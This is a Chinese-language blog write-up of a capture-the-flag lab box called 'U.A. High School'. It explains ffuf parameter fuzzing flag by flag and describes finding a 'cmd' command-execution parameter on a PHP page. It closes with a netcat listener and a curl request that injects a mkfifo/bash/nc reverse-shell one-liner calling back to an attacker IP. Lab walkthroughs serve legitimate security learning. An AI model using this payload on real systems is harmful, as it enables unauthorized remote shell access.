---
icon: pen-to-square
date: 2025-05-07
tags: 
title: U.A. High School
category:
  - 项目
---
## 解题过程
端口扫描和网站爆破之后没有发现可以利用的点
但是在http://10.10.74.25/assets/images的响应很有趣
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250507213758.png)

证明了网页的存在，当访问http://10.10.36.251/assets/时，我们可以发现设置了`session`这意味着我们很可能访问了某个php文件

发现是个php文件后就有了一点操作空间，可以用模糊测试对php的参数进行碰撞
构造命令进行碰撞
```bash
ffuf -u 'http://10.10.85.228/assets/index.php?FUZZ=id' -mc all -ic -t 100 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -fs 0
```
1. ​**​`-u 'http://10.10.85.228/assets/index.php?FUZZ=id'`​**​
    - ​**​作用​**​：指定目标 URL，`FUZZ` 是占位符，表示此处会被字典中的词替换。
    - ​**​示例​**​：若字典中有词 `user`，则实际请求为 `http://.../index.php?user=id`。
2. ​**​`-mc all`​**​
    - ​**​作用​**​：匹配所有 HTTP 状态码（`-mc` 表示 "match HTTP status code"）。
    - ​**​注意​**​：默认情况下，`ffuf` 仅显示状态码为 200、204、301 等的响应。使用 `all` 会显示所有状态码的响应（可能包含误报）。
3. ​**​`-ic`​**​
    - ​**​作用​**​：忽略响应中的 HTML 注释（`ignore comments`），避免因注释内容干扰结果判断。
4. ​**​`-t 100`​**​
    - ​**​作用​**​：设置并发线程数为 100，提高扫描速度。
5. ​**​`-w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt`​**​
    - ​**​作用​**​：指定用于替换 `FUZZ` 的字典文件路径（常见 Web 参数名的小写单词列表）。
6. ​**​`-fs 0`​**​
    - ​**​作用​**​：过滤（不显示）响应体大小为 0 的结果（`fs` 表示 "filter response size"）。
    - ​**​意图​**​：排除无实际内容的响应（如空页面或错误响应）。
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508192204.png)

搜索到参数`cmd`
似乎时RCE漏洞，试试看
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508192422.png)
似乎是base64加密
解一下码看看
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508194401.png)
接下来高端操作来了
### 反弹shell
首先监听反射端口
```bash
nc -lvnp 1232
```
然后构造命令
```bash
curl -s 'http://10.10.38.88/assets/index.php' -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.50.132 1232 >/tmp/f'
```

